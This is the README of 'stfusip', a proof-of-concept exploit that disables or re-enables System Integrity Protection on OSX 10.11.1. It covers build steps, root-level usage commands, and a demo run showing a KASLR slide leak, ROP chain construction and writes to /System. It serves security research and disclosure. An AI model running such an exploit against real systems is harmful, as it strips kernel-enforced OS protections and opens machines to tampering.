# stfusip

## credits & thanks

- [jndok](https://twitter.com/jndok) – a.k.a. myself, for code and exploit.
- [qwertyoruiop](https://twitter.com/qwertyoruiop) – for bug and related help! go follow him on Twitter :)

## compile
Simply do `make`, inside `stfusip` folder. If you encounter linking problems, be sure to check that you have _capstone_ installed on your system. There is a flag inside `Makefile` to specify _capstone_'s `include` directory, be sure to edit it if _capstone_ is located elsewhere on your system!

If you don't have _capstone_ installed, do:
```
brew install capstone
```
and you should be set.

## usage
So, `stfusip` is a simple poc for disabling/enabling SIP, a.k.a. _System Integrity Protection_, a.k.a. _rootless_ on OSX 10.11.1. Bug could theoretically still work on 10.11.2, but I am really not sure.

Super easy to use, **needs to be run as root!**:

```
sudo ./stfusip disable /* this disables SIP */
sudo ./stfusip enable  /* this enables SIP */
```

Here's a demo output:

```
jndoks-Mac-Pro:stfusip jndok$ sudo su
sh-3.2# whoami
root
sh-3.2# touch /System/yolo
touch: /System/yolo: Operation not permitted
sh-3.2# ./stfusip disable
[+] kaslr slide is: 0x0000000c600000
[+] built ROP chain @ 0xbff56c90 (mapped @ 0x261)!
[+] trigger set: 0x18 : 0xffffff800c8c41bf

[-] System Integrity Protection (SIP) has been disabled.
sh-3.2# touch /System/yolo
sh-3.2# ls -ls /System/
total 0
0 drwxr-xr-x  74 root  wheel  2516 Dec  7 09:43 Library
0 -rw-r--r--   1 root  wheel     0 Dec  7 15:46 yolo
sh-3.2# rm -rf /System/yolo
sh-3.2# ls -ls /System/
total 0
0 drwxr-xr-x  74 root  wheel  2516 Dec  7 09:43 Library
sh-3.2# ./stfusip enable
[+] kaslr slide is: 0x0000000c600000
[+] built ROP chain @ 0xbfff6c90 (mapped @ 0x261)!
[+] trigger set: 0x18 : 0xffffff800c8c41bf

touch: /System/test: Operation not permitted
[+] System Integrity Protection (SIP) has been enabled.
sh-3.2# touch /System/yolo
touch: /System/yolo: Operation not permitted
sh-3.2# exit
```
